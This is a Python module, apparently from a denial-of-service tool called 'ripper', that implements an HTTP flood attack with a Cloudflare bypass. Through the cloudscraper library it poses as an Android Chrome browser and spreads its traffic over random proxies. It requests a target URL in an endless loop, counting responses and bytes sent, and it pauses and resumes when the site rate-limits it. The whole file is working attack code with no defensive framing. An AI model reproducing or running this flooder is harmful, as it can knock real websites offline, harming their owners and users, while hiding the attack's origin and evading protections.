import time
from contextlib import suppress
from typing import Any

from cloudscraper import CloudScraper, create_scraper
from requests import Response

from ripper.context.errors import Errors
from ripper.context.target import Target
from ripper.actions.attack_method import AttackMethod

# Forward Reference
Context = 'Context'


class RateLimitException(BaseException):
    """Exception raised for rate limit response."""

    message: str
    """Description of the error"""

    def __init__(self, message: str):
        self.message = message
        super().__init__(self.message)

    def __str__(self):
        return f'CODE 429: {self.message}'


class CloudFlareBypass(AttackMethod):
    """HTTP Flood method with CloudFlare bypass ."""

    name: str = 'HTTP Flood with CloudFlare bypass'
    label: str = 'cloudflare-bypass'

    _target: Target
    _ctx: Context
    _proxy: Any = None
    _http_connect: CloudScraper = None

    def __init__(self, target: Target, context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self):
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)

        return conn

    def __call__(self, *args, **kwargs):
        browser = {
            'browser': 'chrome',
            'platform': 'android',
            'desktop': False
        }
        with suppress(Exception), create_scraper(browser=browser) as self._http_connect:
            self._ctx.target.statistic.connect.status_success()
            while self.send(self._http_connect):
                if self._ctx.dry_run:
                    break
                continue

    def send(self, scraper: CloudScraper):
        try:
            with scraper.get(self._target.url(),
                             headers=self._ctx.headers_provider.headers,
                             proxies=self._proxy) as response:
                self._ctx.target.statistic.http_stats[response.status_code] += 1
                self.check_rate_limit(response)
        except RateLimitException as e:
            self._ctx.add_error(Errors(type(e).__name__, e.__str__()))
            time.sleep(5.01)
        except Exception as e:
            self._ctx.add_error(Errors(type(e).__name__, e.__str__()[:128]))
            self._ctx.target.statistic.connect.status_failed()
        else:
            sent_bytes = self._size_of_request(response.request)
            self._ctx.target.statistic.packets.status_sent(sent_bytes)
            self._proxy.report_success() if self._proxy is not None else 0
            return True
        return False

    @staticmethod
    def check_rate_limit(response: Response):
        """Check status code for Rate limits applied and throws exception."""
        if response.status_code == 429:
            raise RateLimitException(response.reason)

    @staticmethod
    def _size_of_request(request) -> int:
        size: int = len(request.method) +\
                    len(request.url) + \
                    len('\r\n'.join(f'{k}: {v}' for k, v in request.headers.items()))
        return size
